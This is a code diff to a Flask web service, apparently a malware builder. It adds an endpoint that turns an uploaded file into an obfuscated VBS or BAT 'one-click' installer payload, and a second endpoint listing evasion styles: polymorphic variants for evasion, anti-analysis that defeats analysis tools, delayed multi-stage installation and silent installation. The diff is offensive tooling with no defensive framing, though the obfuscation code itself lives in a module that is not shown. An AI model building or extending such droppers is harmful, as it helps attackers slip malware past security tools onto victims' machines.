@@ -15,6 +15,7 @@ import shutil
 
 from payload_generator import PayloadGenerator
 from fingerprint_manager import FingerprintManager
+from payload_installer import create_one_click_payload
 
 app = Flask(__name__)
 CORS(app)
@@ -316,6 +317,80 @@ def batch_generate():
         return jsonify({'success': True, 'results': results})
     except Exception as e:
         return jsonify({'error': f'Batch generation failed: {str(e)}'}), 500
+
+
+@app.route('/api/generate-one-click', methods=['POST'])
+def generate_one_click():
+    """Generate one-click self-extracting installer payload"""
+    data = request.json
+    file_id = data.get('file_id')
+    obfuscation_style = data.get('obfuscation_style', 'polymorphic')
+    file_type = data.get('file_type', 'vbs')  # vbs, bat, or exe
+
+    if not file_id:
+        return jsonify({'error': 'File ID required'}), 400
+
+    try:
+        # Find uploaded file
+        uploaded_file = None
+        for f in os.listdir(app.config['UPLOAD_FOLDER']):
+            if f.startswith(file_id):
+                uploaded_file = os.path.join(app.config['UPLOAD_FOLDER'], f)
+                break
+
+        if not uploaded_file or not os.path.exists(uploaded_file):
+            return jsonify({'error': 'File not found'}), 404
+
+        # Build command to execute the file
+        filename = os.path.basename(uploaded_file)
+        cmd = f'"{uploaded_file}"'
+
+        # Generate one-click payload
+        result = create_one_click_payload(cmd, obfuscation_style)
+
+        # Save payload
+        output_id = str(uuid.uuid4())[:8]
+
+        if file_type == 'vbs':
+            payload_content = result['vbs_payload']
+            filename_out = result['filename_vbs']
+        elif file_type == 'bat':
+            payload_content = result['bat_payload']
+            filename_out = result['filename_bat']
+        else:
+            payload_content = result['vbs_payload']
+            filename_out = result['filename_vbs']
+
+        output_path = os.path.join(OUTPUT_FOLDER, f"{output_id}_{filename_out}")
+
+        with open(output_path, 'w') as f:
+            f.write(payload_content)
+
+        return jsonify({
+            'success': True,
+            'output_id': output_id,
+            'filename': filename_out,
+            'payload': payload_content,
+            'size': len(payload_content),
+            'instructions': result['instructions'],
+            'style': obfuscation_style,
+            'file_type': file_type
+        })
+
+    except Exception as e:
+        return jsonify({'error': f'One-click generation failed: {str(e)}'}), 500
+
+
+@app.route('/api/one-click-styles', methods=['GET'])
+def get_one_click_styles():
+    """Get available one-click obfuscation styles"""
+    styles = {
+        'polymorphic': 'Multiple polymorphic variants for evasion',
+        'anti_analysis': 'Detects and defeats analysis tools',
+        'multi_stage': 'Multi-stage installation with delays',
+        'silent': 'Silent installation with no output'
+    }
+    return jsonify({'styles': styles})
 
 
 if __name__ == '__main__':
